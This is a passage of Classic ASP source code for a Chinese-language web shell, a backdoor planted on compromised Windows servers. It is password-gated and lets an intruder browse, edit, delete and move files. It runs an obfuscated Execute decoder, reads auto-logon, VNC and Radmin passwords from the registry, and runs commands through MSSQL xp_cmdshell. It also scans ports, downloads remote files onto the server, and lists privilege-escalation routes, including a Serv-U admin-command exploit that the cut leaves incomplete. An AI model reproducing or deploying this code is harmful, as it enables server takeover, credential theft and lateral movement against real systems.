TIn=T2.ReadText : T2.Close
DStart=InStrB(DIEnd,TDa,TSt)
FStart=InStr(22,TIn,"name=""",1)+6
FEnd=InStr(FStart,TIn,"""",1)
UpName=lcase(Mid (TIn,FStart,FEnd-FStart))
if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart=InStr(FEnd,TIn,"filename=""",1)+10
FEnd=InStr(FStart,TIn,"""",1)
FStart=InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd=InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize=DStart -DIEnd -3
if not D2.Exists(UpName) then
D2.add UpName,TFL
end if
else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position=DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position=0 : T2.Type=2
T2.Charset ="gb2312"
SFV=T2.ReadText
T2.Close
if D1.Exists(UpName) then
D1(UpName)=D1(UpName)&", "&SFV
else
D1.Add UpName,SFV
end if
end if
DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
D1.RemoveAll:D2.RemoveAll
set D1=nothing:set D2=nothing
T1.Close:set T1 =nothing
end if
End Sub

End Class
Class FIF
dim FileSize,FileStart
Private Sub Class_Initialize
FileSize=0
FileStart= 0
End Sub
Public function SaveAs(F)
dim T3
SaveAs=true
if trim(F)="" or FileStart=0 then exit function
set T3=CreateObject(Sot(6,0))
T3.Mode=3 : T3.Type=1 : T3.Open
T1.position=FileStart
T1.copyto T3,FileSize
T3.SaveToFile F,2
T3.Close
set T3=nothing
SaveAs=false
end function
End Class
Class LBF
Dim CF
Private Sub Class_Initialize
SET CF=CreateObject(Sot(0,0))
End Sub
Private Sub Class_Terminate
Set CF=Nothing
End Sub
Function ShowDriver()
For Each D in CF.Drives
 o"<tr><td id=d onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><font face='wingdings'>8</font> <a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>本地磁盘 ("&D.DriveLetter&":)</a></td></tr>" 
Next
End Function


Function Show1File(Path)
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>" 
For Each F in FOLD.subfolders
SI=SI&"<td height=10 width=17% align=center><div style='border:1px solid "&BorderColor&";padding-bottom:4px' id=d><a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""进入""><font face='wingdings' size='6'>0</font><br>"&F.Name&"</a><br><a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")' onclick='return yesok()' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")' onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")' onclick='return yesok()' class='am' title='移动'>Move</a>"
i=i+1
If i mod 6=0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
o SI &"<hr/>" : SI="":i=0
SI="<table width='100%' align=center><tr><td id=s><b id=x>Filename</b></td><td id=s height=22><b id=x>Size</b></td><td id=s><b id=x>Type</b></td><td id=s><b id=x>Operating</b></td><td id=s><b id=x>Last Modified</b></td><td></td>"
For Each L in Fold.files

SI=SI&"<tr><td height='20' id=d><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'><font face='wingdings' size='4'>2</font> "&L.Name&"</a></td><Td id=d>"&clng(L.size/1024)&"K</td><Td id=d>"&L.Type&"</td><Td id=d><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>Edit </a>"


Si=Si&"<a onclick=""window.open('?Action=EditPower&PowerPath="&RepAth(PaTh&"\"&L.nAme)&"','EditPower','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=300,height=200')"" href='###' class='am' title='权限'>权限</a>"
Dim EditOOK
EditOOK=1
EditOOV=l.Attributes
If EditOOV >= 128 Then
EditOOV = EditOOV - 128
End If
If EditOOV >= 64 Then
EditOOV = EditOOV - 64
End If
If EditOOV >= 32 Then
EditOOV = EditOOV - 32
End If
If EditOOV >= 16 Then
EditOOV = EditOOV - 16
End If:If EditOOV >= 8 Then
EditOOV = EditOOV - 8
End If
If EditOOV >= 4 Then
EditOOV = EditOOV - 4
EditOOK=0
End If
If EditOOV >= 2 Then
EditOOV = EditOOV - 2
EditOOK=0
End If
If EditOOV >= 1 Then
EditOOV = EditOOV - 1
EditOOK=0
End If
if EditOOK=0 then
si=si&"<font face='webdings' size='3' color=red>x</font>"
else
si=si&"√"
end if
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")' onclick='return yesok()' class='am' title='删除'> Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>Move</a></td><td id=d>"&replace(L.DateLastModified,"/","-")&""
i=i+1
Next
o SI&""

if session("servec")=1 then
session("servec")=session("servec")+1
else
if Action<>"" then session("servec")=session("servec")+1
end if
Set FOLD=Nothing
End function

Function EditFile(Path)
If Request("Action2")="Post" Then
Set T=CF.CreateTextFile(Path)
T.WriteLine Request.form("content")
T.close
Set T=nothing
SI="<center><br><br><br>恭喜文件"&Path&"保存成功！</center>"
o SI
o BackUrl
Response.End
End If
If Path<>"" Then
Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall) 
T.close
Set T=Nothing
Else
Path=Session("FolderPath")&"hack.asp":Txt="新建文件"
End If
o "<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'><input name='Action' value='EditFile' Type='hidden'><input name='FName' value='"&Path&"' style='width:100%'><br><textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br><hr><input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='Reset'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='Save'></form>"
End Function
Function DelFile(Path)
If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>恭喜文件 "&Path&" 删除成功！</center>"
SI=SI&BackUrl
o SI
End If
End Function
Function CopyFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.CopyFile Path(0),Path(1)
SI="<center><br><br><br>恭喜文件"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
o SI 
End If
End Function
Function MoveFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.MoveFile Path(0),Path(1)
SI="<center><br><br><br>恭喜文件"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
o SI 
End If
End Function
Function DelFolder(Path)
If CF.FolderExists(Path) Then
CF.DeleteFolder Path
SI="<center><br><br><br>恭喜目录"&Path&"删除成功！</center>"
SI=SI&BackUrl
o SI
End If
End Function
Function CopyFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.CopyFolder Path(0),Path(1)
SI="<center><br><br><br>恭喜目录"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
o SI
End If
End Function
Function MoveFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.MoveFolder Path(0),Path(1)
SI="<center><br><br><br>恭喜目录"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
o SI
End If
End Function
Function NewFolder(Path)
If Not CF.FolderExists(Path) and Path<>"" Then
CF.CreateFolder Path
SI="<center><br><br><br>恭喜目录"&Path&"新建成功！</center>"
SI=SI&BackUrl
o SI
End If
End Function
End Class
Execute(ny(x))
Function ny(ed):    For i = 1 To Len(ed)
If Mid(ed, i, 1) <> "　" Then
If Asc(Mid(ed, i, 1)) < 32 Or Asc(Mid(ed, i, 1)) > 126 Then
Else:zx = Asc(Mid(ed, i, 1)) -b
If zx > 126 Then
zx = zx -95
ElseIf zx < 32 Then: zx = zx + 95
End If:t = t & Chr(zx):End If
Else:End If:Next:ny = t:End Function


'=========密码阶段=========================
If Session("webadministrators")<>UserPass Then
	If Request.Form("LP")<>"" Then
	If Request.Form("LP")=UserPass Then
	Session("webadministrators")=UserPass
	Cosnt E
	response.redirect url
else
o"<br><br><br><div align=center><font color=#FF0000>对不起，您输入的密码有误，系统不能让你登陆！</font></div>"
end if
else
o "<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><form action='"&url&"' method='post'><b>PassWord</b>：<input name='LP' type='password' size='22'> <input type='submit' value='登录'><hr>http://hi.baidu.com/r00ts<p/><table width=""450"" border=""1"" cellpadding=""10""><tr><td><div align=center></td></tr></table></center>"
end if
Response.write 
response.end
end If

sub getTerminalInfo()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
o "<b id=x>【Detection Network】</b><br><hr>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
Notcpipfilter=1
End If
ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
For i=LBound(Apds) To UBound(Apds)-1
ApdB=Replace(Apds(i),"\Device\","")
o "网卡"&i&"的序列为:"&ApdB&"<br>"
Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
IPKey=Path&ApdB&"\IPAddress"
IPaddr=Wsh.Regread(IPKey)
If IPaddr(0)<>"" Then
For j=Lbound(IPAddr) to Ubound(IPAddr)
o "<font face=webdings>8</font>&nbsp;IP地址"&j&"为:"&IPAddr(j)&"<br>"
Next
Else
o "<font face=webdings>8</font>&nbsp;IP地址无法读取或没有设置<br>"
End if
GateWayKey=Path&ApdB&"\DefaultGateway"
GateWay=Wsh.Regread(GateWayKey)
If isarray(GateWay) Then
For j=Lbound(Gateway) to Ubound(Gateway)
o "<font face=webdings>8</font>&nbsp;网关"&j&"为:"&Gateway(j)&"<br>"
Next
Else
o "<font face=webdings>8</font>&nbsp;默认网关无法读取或没有设置<br>"
End if
DNSKey=Path&ApdB&"\NameServer"
DNSstr=Wsh.RegRead(DNSKey)
If DNSstr<>"" Then
o "<font face=webdings>8</font>&nbsp;网卡DNS为:"&DNSstr&"<br>"
Else
o "<font face=webdings>8</font>&nbsp;默认DNS无法读取或没有设置<br>"
End If
if Notcpipfilter=1 Then 
o "<font face=webdings>8</font>&nbsp;没有Tcp/IP筛选<br>"
else
ETK="\TCPAllowedPorts"
EUK="\UDPAllowedPorts"
FullTCP=Path&ApdB&ETK
FullUDP=path&ApdB&EUK
tcpallow=Wsh.RegRead(FullTCP)
If tcpallow(0)="" or tcpallow(0)=0 Then
o "<font face=webdings>8</font>&nbsp;允许的TCP端口为:全部<br>"
RRS SI
Else
o "<font face=webdings>8</font>&nbsp;允许的TCP端口为:"
For j = LBound(tcpallow) To UBound(tcpallow)
o tcpallow(j)&","
Next
o "<Br>"
End if
udpallow=Wsh.RegRead(FullUDP)
If udpallow(0)="" or udpallow(0)=0 Then
o "<font face=webdings>8</font>&nbsp;允许的UDP端口为:全部<br>"
Else
o "<font face=webdings>8</font>&nbsp;允许的UDP端口为:"
for j = LBound(udpallow) To UBound(udpallow)
o UDPallow(j)&","
next
o "<br>"
End if
End if
o "-----------------------------------------------------------<br>"
Next
end if
o "<br><br><b id=x>【Detection Special Port】</b><br><hr>"
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23(默认设置)"
o "<font face=webdings>8</font>&nbsp;Telnet端口:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="无法读取.请确认是否为Windows Server版本主机"
o "<font face=webdings>8</font>&nbsp;Terminal Service端口为:"&TermPort&"<br>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="无法获取.请确认主机是否安装pcAnywhere"
o "<font face=webdings>8</font>&nbsp;PcAnywhere端口为:"&PAWPort&"<br>"
o "------------------------------------------------------------<br>"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
o"终端服务端口及自动登录<ol>"
If termPort = "" Or Err.Number <> 0 Then 
o"无法得到终端服务端口, 请检查权限是否已经受到限制.<br/>"
 Else
o"当前终端服务端口: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
o"自动登录的系统帐户: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
o"False"
End If
o"自动登录的帐户密码: " & autoLoginPassword & "<br>"
End If
o"</ol>"
o "<br><b id=x>【Detection System Software】</b><br><hr>"
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
o "系统软件支持:<Br>"
if Instr(Pathinfo,"perl") Then o "<font face=webdings>8</font>&nbsp;Perl脚本:支持<br>"
if instr(Pathinfo,"java") Then o "<font face=webdings>8</font>&nbsp;Java脚本:支持<br>"
if instr(Pathinfo,"microsoft sql server") Then o "<font face=webdings>8</font>&nbsp;MSSQL数据库服务:支持<br>"
if instr(Pathinfo,"mysql") Then o "<font face=webdings>8</font>&nbsp;MySQL数据库服务:支持<br>"
if instr(Pathinfo,"oracle") Then o "<font face=webdings>8</font>&nbsp;Oracle数据库服务:支持<br>"
if instr(Pathinfo,"cfusionmx7") Then o "<font face=webdings>8</font>&nbsp;CFM服务器:支持<br>"
if instr(Pathinfo,"pcanywhere") Then o "<font face=webdings>8</font>&nbsp;赛门铁克PcAnywhere控制:支持<br>"
if instr(Pathinfo,"Kill") Then o "<font face=webdings>8</font>&nbsp;Kill杀毒软件:支持<br>"
if instr(Pathinfo,"kav") Then o "<li> 金山系列杀毒软件:支持<br>"
if instr(Pathinfo,"antivirus") Then o "<font face=webdings>8</font>&nbsp;赛门铁克杀毒软件:支持<br>"
if instr(Pathinfo,"rising") Then o "<font face=webdings>8</font>&nbsp;瑞星系列杀毒软件:支持<br>"
paths=split(SoftPath,";")
o "------------------------------------<br>"
o "系统当前路径变量:<br>"
For i=Lbound(paths) to Ubound(paths)
o "<font face=webdings>8</font>&nbsp;"&paths(i)&"<br>"
next
o "<br><br><B id=x>【Detection System Setting】</b><br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="无法读取主机名.<br>"
o "<font face=webdings>8</font>&nbsp;当前主机名为:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
o "<font face=webdings>8</font>&nbsp;默认管理员用户名为:"&AdminName&"<br>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
o "<font face=webdings>8</font>&nbsp;用户自动登入:未启用<br>"
Else
o "<font face=webdings>8</font>&nbsp;用户自动登入:启用<br>"
Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
o "<font face=webdings>8</font>&nbsp;用户名:"&Admin&"<br>"
o "<font face=webdings>8</font>&nbsp;密码:"&Passwd&"<br>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="是" else disply="否"
o "<font face=webdings>8</font>&nbsp;是否显示上次登入用户:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
o "<font face=webdings>8</font>&nbsp;Telnet Ntml设置为:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
o"<font face=webdings>8</font>&nbsp;当前活动网卡为:"&kk&"<br>"
o "------------------------------------<br><br><br>"
o "<b id=x>【Detection Server Vulnerability】</b><br><hr>"
Set objComputer = GetObject("WinNT://.")
Set sa = Server.CreateObject("Shell.Application")
objComputer.Filter = Array("Service")
On Error Resume Next
For Each objService In objComputer
if objService.Name="Serv-U" Then
if objService.ServiceAccountName="LocalSystem" Then
o "<font face=webdings>8</font>&nbsp;服务器中有Serv-U安装,且以LocalSystem权限启动,可以考虑用su.exe工具提权<br>"
End if
End if
if lcase(objService.Name)="apache" Then
if objService.ServiceAccountName="LocalSystem" Then
If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
o "<font face=webdings>8</font>&nbsp;当前WEB服务器为Apache.可以直接提权<br>"
Else
o "<font face=webdings>8</font>&nbsp;服务器中有Apache服务存在,启动权限为LocalSystem,可以考虑PHP木马<br>"
End if
end if
End if
if instr(lcase(objService.Name),"tomcat") Then
if objService.ServiceAccountName="LocalSystem" Then
o "<font face=webdings>8</font>&nbsp;服务器中有Tomcat,且以LocalSystem权限启动,可以考虑使用Jsp木马提权<br>"
End if
End if
if instr(lcase(objService.Name),"winmail") Then
if objService.ServiceAccountName="LocalSystem" Then
o "<font face=webdings>8</font>&nbsp;服务器中有Magic Winmail,且以LocalSystem权限启动,可以查找WebMail目录,并且写入PHP木马<br>"
End if
End if
Next
Set fso=Server.Createobject("Scripting.FileSystemObject")
Sysdrive=left(Fso.GetspecialFolder(2),2)
servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
o "<font face=webdings>8</font>&nbsp;发现pcAnywhere密码文件,可以从默认目录下载并破解得到pcAnywhere密码"
End if 
End Sub
sub ReadREG()
o "<br><form method=post><table width=800 border=0 align=center><tr><td id=s colspan=3 align=center><b id=x>Read Regedit</B></td></tr><tr><td id=d><input type=hidden value=ReadReg name=theAct><select onChange='this.form.thePath.value=this.value;'><option value=''>选择自带的键值</option><option value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName'>ComputerName</option><option value=""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"">网卡列表</option><option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"">Radmin密码</option><option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"">Radmin端口</option><option value=""HKCU\Software\ORL\WinVNC3\Password"">VNC3密码</option><option value=""HKCU\Software\ORL\WinVNC3\PortNumber"">VNC3端口</option><option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\Password"">VNC4密码</option><option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\PortNumber"">VNC4端口</option><option value=""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"">3389端口</option><option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"">PcAnyW数据端口</option><option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"">PcAnyW状态端口</option><option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤1</option><option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤2</option><option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤3</option><option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option><option value='HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP'>防火开放</option><option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts'>允许开放的UDP端口</option><option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts'>允许开放的TCP端口</option></select></td><td id=d><input name=thePath value='' size=80></td><td><input type=button value='读取键值' onclick='this.form.submit()'></td></tr></table></form>"
o"<p><hr>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
o "<li>" & theArray(i)
Next
Else
o "<li>" & theArray
End If
end if
end sub
Function adminab()
Response.Expires=0
on error resume next '查找Administrators组帐号
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
o admin.Name&"<br>"
Next
if err then
o "人品有问题:Wscript.Network"
end if
End Function

FuncTion mssql()
SI="<br><form name=form method=post action=""""><table width=""85%"" align='center'><tr align=center><Td id=s><b id=x>MSSQL Commander</b></td></tr><tr align='center'><td id=d><b id=x>Command：</b><input type=text name=MMD size=35 >&nbsp;<b id=x>UserName：</b><input type=text name=U value=sa>&nbsp;<b id=x>Password：</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>":o SI:SI="":If trim(request.form("MMD"))<>"" Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:o request.form("MMD") & "<br>"& strResult:end FuncTion

sub ScanPort()
Server.ScriptTimeout=7776000
if request.Form("port")="" then
PortList="21,1433,3389,43958,4899,3306,5631,5632"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
o"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'><table width=""60%"" align='center'><tr align=center><td id=s colspan=2><B id=x>Port Scan</B></td></tr><TR><TD id=d><b id=x>Scan&nbsp;&nbsp;IP:</b></td><Td id=d><input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'></TD></tr><Tr><td id=d><b id=x>Port List:</b></td><Td id=d><input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'></td></tr><tr><td id=d colspan=2><input name='submit' type='submit' class='buttom' value=' Scan '><input name='scan' type='hidden' id='scan' value='111'></td></tr></table></form>"
If request.Form("scan") <> "" Then
timer1=timer
o("<b>扫描报告:</b><br><hr>")
tmp=Split(request.Form("port"),",")
ip=Split(request.Form("ip"),",")
For hu=0 to Ubound(ip)
If InStr(ip(hu),"-")=0 Then
For i=0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx=InStr(tmp(i), "-")
If seekx > 0 Then
startN=Left(tmp(i), seekx - 1 )
endN=Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j=startN To endN
Call Scan(ip(hu), j)
Next
Else
o(startN&" or "&endN&" is not number<br>")
End If
Else
o(tmp(i)&" is not number<br>")
End If
End If
Next
Else
ipStart=Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx=Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i=0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart&xxx, tmp(i))
Else
seekx=InStr(tmp(i), "-")
If seekx > 0 Then
startN=Left(tmp(i), seekx - 1 )
endN=Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j=startN To endN
Call Scan(ipStart&xxx,j)
Next
Else
o(startN&" or "&endN&" is not number<br>")
End If
Else
o(tmp(i)&" is not number<br>")
End If
End If
Next
Next
End If
Next
timer2=timer
thetime=cstr(int(timer2-timer1))
o"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn=Server.CreateObject(Sot(5,0))
connstr="Provider=SQLOLEDB.1;Data Source="&targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout=1
conn.open connstr
If Err Then
If Err.number=-2147217843 or Err.number=-2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
o(targetip&":"&portNum&".........关闭<br>")
Else
o(targetip&":"&portNum&".........<font color=red>开放</font><br>")
End If
End If
End If
End Sub

Function upload()
response.write "下载到服务器:无回显...为了节省.所以无回显<form method=post><input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/><input name=thePath value=""" & server.HtmlEncode(Server.MapPath(".")) & """ size=80><input type=checkbox name=overWrite value=2>存在覆盖<input type=hidden value=downFromUrl name=theAct></form><hr/>"
        If isDebugMode = False Then
            On Error Resume Next
        End If
        Dim Http, theUrl, thePath, stream, fileName, overWrite
        theUrl = Request("theUrl")
        thePath = Request("thePath")
        overWrite = Request("overWrite")
        Set stream = Server.CreateObject("adodb.stream")
        Set Http = Server.CreateObject("MSXML2.XMLHTTP")
        
        If overWrite <> 2 Then
            overWrite = 1
        End If
        
        Http.Open "GET", theUrl, False
        Http.Send()
        If Http.ReadyState <> 4 Then 

        End If
        
        With stream
            .Type = 1
            .Mode = 3
            .Open
            .Write Http.ResponseBody
            .Position = 0
            .SaveToFile thePath, overWrite
            If Err.Number = 3004 Then
                Err.Clear
                fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
                If fileName = "" Then
                    fileName = "index.htm.txt"
                End If
                thePath = thePath & "\" & fileName
                .SaveToFile thePath, overWrite
            End If
            .Close
        End With
        chkErr(Err)
        
        Set Http = Nothing
        Set Stream = Nothing

        If isDebugMode = False Then
            On Error Resume Next
        End If

End Function

Select Case Action
Case "MainMenu":MainMenu()
case "ScanPort":ScanPort()
Case "getTerminalInfo":getTerminalInfo()
Case "PageAddToMdb":PageAddToMdb()

Case "Servu"
SUaction=request("SUaction")
if not isnumeric(SUaction) then response.end
user=trim(request("u"))
pass=trim(request("p"))
port=trim(request("port"))
cmd=trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport=65500
timeout=3
loginuser="User "&user&vbCrLf
loginpass="Pass "&pass&vbCrLf
deldomain="-DELETEDOMAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&ftpport&vbCrLf
mt="SITE MAINTENANCE"&vbCrLf
newdomain="-SETDOMAIN"&vbCrLf&"-Domain=goldsun|0.0.0.0|"&ftpport&"|-1|1|0"&vbCrLf&"-TZOEnable=0"&vbCrLf&" TZOKey="&vbCrLf
newuser="-SETUSERSETUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&ftpport&vbCrLf&"-User=go"&vbCrLf&"-Password=od"&vbCrLf&_
"-HomeDir=c:\\"&vbCrLf&"-LoginMesFile="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPaths=1"&vbCrLf&_
"-NeedSecure=0"&vbCrLf&"-HideHidden=0"&vbCrLf&"-AlwaysAllowLogin=0"&vbCrLf&"-ChangePassword=0"&vbCrLf&_
